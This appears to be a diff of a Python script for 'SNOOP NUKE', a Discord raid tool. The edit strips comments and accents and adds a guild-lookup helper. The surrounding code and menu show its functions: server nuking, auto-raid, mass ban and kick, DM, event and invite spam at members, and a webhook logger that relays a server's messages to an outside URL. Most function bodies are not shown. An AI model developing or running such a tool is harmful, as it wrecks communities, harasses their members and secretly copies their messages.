@@ -1,8 +1,3 @@
-# ═══════════════════════════════════════════════════════════════
-#  SNOOP NUKE  v2.0.0  –  Discord Raid Tool
-#  https://discord.gg/snoop
-# ═══════════════════════════════════════════════════════════════
-
 import os, sys, time, random, asyncio, json, re, webbrowser, urllib.request, aiohttp
 from datetime import datetime, timezone, timedelta
 from shutil import get_terminal_size
@@ -13,7 +8,6 @@ import discord
 from discord.ext import commands
 from discord import Activity, ActivityType
 
-# ── CONSTANTES ──────────────────────────────────────────────────
 NO_BAN_KICK_ID = []
 PUB = "||@everyone||  **⚡ RAID BY SNOOP NUKE ⚡**  :  https://discord.gg/snoop"
 PUB_SHORT = "discord.gg/snoop"
@@ -32,7 +26,7 @@ AUTO_RAID_CONFIG = {
 EMBED_CONFIG = {
     "title": "\U0001f4a6  __SNOOP NUKE__  \U0001f4a6",
     "description": (
-        "**Ton serveur vient d'être raid par SNOOP NUKE !**\n\n"
+        "**Ton serveur vient d'etre raid par SNOOP NUKE !**\n\n"
         "_ _\n"
         "**> https://discord.gg/snoop**\n"
         "_ _\n"
@@ -56,7 +50,6 @@ SERVER_CONFIG = {
 }
 BOT_PRESENCE = {"type": "playing", "text": "discord.gg/snoop"}
 
-# ── STYLE ──────────────────────────────────────────────────────
 RS = "\033[0m"; B = "\033[1m"
 V1 = "\033[38;5;55m"; V2 = "\033[38;5;93m"; V3 = "\033[38;5;129m"
 V4 = "\033[38;5;141m"
@@ -74,7 +67,6 @@ def _clr(): os.system('cls' if os.name == 'nt' else 'clear')
 def _vis(s): return re.sub(r'\033\[[^m]*m', '', s)
 def _vl(s): return len(_vis(s))
 
-# ── ANIMATIONS ──────────────────────────────────────────────────
 def fx_glitch(text: str, n=5):
     gc = "!@#$%^&*?+"
     for i in range(n):
@@ -110,7 +102,6 @@ def fx_spin(label: str, dur=.9):
         i += 1
     sys.stdout.write(f"\r  {V2}{B}+{RS}  {wht(label)}\n")
 
-# ── LOGGER ──────────────────────────────────────────────────────
 _LOGS = []
 
 def _ts():
@@ -151,7 +142,6 @@ def _summary(action: str, ok: int, fail: int, t: float):
     print(f"  {V2}{B}[+]{RS} {V3}{ok} ok{RS}   {V1}[-]{RS} {DIM}{fail} err{RS}   {DIM}{t:.2f}s{RS}")
     print(f"  {D2}{'─' * 40}{RS}\n")
 
-# ── NOUVEAU BANNER SNOOP (modern style) ──────────────────────
 _BANNER = [
     "░▒▓███████▓▒░▒▓███████▓▒░ ░▒▓██████▓▒░ ░▒▓██████▓▒░░▒▓███████▓▒░       ░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░ ",
     "░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        ",
@@ -167,7 +157,6 @@ _SHADES_BANNER = [V3, V2, V2, V1, V1, V4, V4]
 def _print_banner(bot_n="", srv_n="", members=0, animated=False):
     _clr()
     term_width = _tw()
-    # On prend la première ligne pour calculer la largeur (en supprimant les codes couleur)
     banner_width = max(len(_vis(line)) for line in _BANNER)
     padding = max(0, (term_width - banner_width) // 2)
 
@@ -182,7 +171,6 @@ def _print_banner(bot_n="", srv_n="", members=0, animated=False):
         else:
             print(" " * padding + colored_line)
 
-    # Ligne de séparation avec infos
     if bot_n:
         info = f"{DIM}bot{RS} {c1(bot_n)}  {D2}│{RS}  {DIM}server{RS} {wht(srv_n or '-')}  {D2}│{RS}  {DIM}members{RS} {c1(str(members))}"
         sep = "─" * min(_vl(info) + 2, term_width - 2)
@@ -190,7 +178,6 @@ def _print_banner(bot_n="", srv_n="", members=0, animated=False):
         print(f"  {info}")
         print(f"  {D2}{sep}{RS}\n")
 
-# ── MENU ────────────────────────────────────────────────────────
 _MENU = [
     [
         [("01", "Nuke"), ("02", "Auto Raid"), ("03", "Ban All"), ("04", "Kick All")],
@@ -272,7 +259,9 @@ def _print_menu(page=1):
     print(f"{' ' * pad}{V3}SNOOP NUKE v2.0.0{RS}  {DIM}Discord : snoop{RS}")
     print(f"\n{' ' * pad}{V2}{B}[Option]{RS} {D2}>>{RS} ", end="", flush=True)
 
-# ── HELPERS ─────────────────────────────────────────────────────
+def _get_guild(sid):
+    return bot.get_guild(int(sid))
+
 def _pub_append(content: str) -> str:
     if "discord.gg/snoop" in content:
         return content
@@ -351,8 +340,6 @@ def _skip(m, bot_id):
             log_warn(f"skip {m.name}")
         return True
     return False
-
-# ── COMMANDES ───────────────────────────────────────────────────
 
 async def nuke(sid):
     g = _get_guild(sid)
@@ -681,7 +668,7 @@ async def event_spam(sid):
             log_err(_vis(str(e)))
             fail += 1
     _summary("Event Spam", ok, fail, time.perf_counter()-t)
-
+    
 async def invite_spam(sid):
     g = _get_guild(sid)
     if not g: return
@@ -816,7 +803,7 @@ async def dm_spam_user(sid):
     except ValueError:
         log_err("nombre invalide")
         return
-    msg = _ask("message  [enter = pub par défaut]") or PUB
+    msg = _ask("message  [enter = pub par defaut]") or PUB
     target = None
     try:
         target = await g.fetch_member(uid)
@@ -837,7 +824,7 @@ async def dm_spam_user(sid):
             log_ok(f"[{i+1}/{count}]  {target.name}")
             ok += 1
         except discord.Forbidden:
-            log_err(f"DMs fermés —  {target.name}")
+            log_err(f"DMs fermes —  {target.name}")
             fail += count - i
             break
         except discord.HTTPException as e:
@@ -1290,7 +1277,6 @@ async def server_info(sid):
     print(f"  {D2}{'─' * 38}{RS}")
     print()
 
-# ── WEBHOOK LOGGER ─────────────────────────────────────────────
 _wh_logger_url = ""
 _wh_logger_guild_id = 0
 _wh_logger_active = False
@@ -1321,7 +1307,7 @@ async def webhook_logger(sid):
     _wh_logger_url = url
     _wh_logger_guild_id = g.id
     _wh_logger_active = True
-    await _dispatch_log(f"\u2705 **SNOOP NUKE Logger activé** on `{g.name}`")
+    await _dispatch_log(f"\u2705 **SNOOP NUKE Logger active** on `{g.name}`")
     log_ok(f"active logger  ->  {url[:55]}...")
     log_warn("remains active until quit")
 
@@ -1336,7 +1322,6 @@ async def webhook_logger_check(message: discord.Message):
              f"```{(message.content or '[no text]')[:1700]}```")
     await _dispatch_log(entry)
 
-# ── ACTIONS MAP ─────────────────────────────────────────────────
 def _actions(sid, bot_id):
     return {
         '01': lambda: nuke(sid),
@@ -1380,7 +1365,6 @@ def _actions(sid, bot_id):
         '39': lambda: event_spam(sid),
     }
 
-# ── BOOT ────────────────────────────────────────────────────────
 def _boot():
     _clr()
     rows, cols, dur = 7, min(_tw()-2, 80), 1.1
